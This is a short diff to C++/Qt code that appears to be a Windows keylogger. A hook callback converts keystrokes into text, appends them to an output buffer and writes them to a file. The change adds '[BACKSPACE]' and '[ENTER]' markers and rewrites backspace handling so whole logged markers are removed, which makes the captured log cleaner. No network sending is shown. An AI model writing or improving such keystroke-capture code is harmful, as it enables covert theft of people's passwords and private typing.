@@ -5,6 +5,11 @@ static QByteArray outputBuffer;
 static QFile output;
 static QTimer *timer;
 
+static QStringList actionKeys = {
+    "[BACKSPACE]",
+    "[ENTER]"
+};
+
 Core::Core(QObject *parent) :
     QObject(parent)
 {
@@ -105,7 +110,26 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
             if (keyString == "ENTER") {
                 toBeAppended = "\n[" + keyString + "]\n";
             } else if (keyString == "BACKSPACE" && !outputBuffer.isEmpty()) {
-                outputBuffer.chop(1);
+                int toChop = 1;
+
+                foreach (QString actionKey, actionKeys) {
+                    QByteArray actionKeyByteArray = QByteArray::fromStdString(actionKey.toStdString());
+
+                    QList<QByteArray> actionKeyVersions;
+                    actionKeyVersions.append(actionKeyByteArray);
+                    actionKeyVersions.append(actionKeyByteArray.append('\n'));
+
+                    foreach (QByteArray actionKeyVersion, actionKeyVersions) {
+                        if (outputBuffer.endsWith(actionKeyVersion)) {
+                            toChop = actionKeyVersion.length();
+                            break;
+                        }
+                    }
+
+                    if (toChop > 1) { break; }
+                }
+
+                outputBuffer.chop(toChop);
             } else {
                 toBeAppended = QString::fromUtf16((ushort *) buffer);
             }
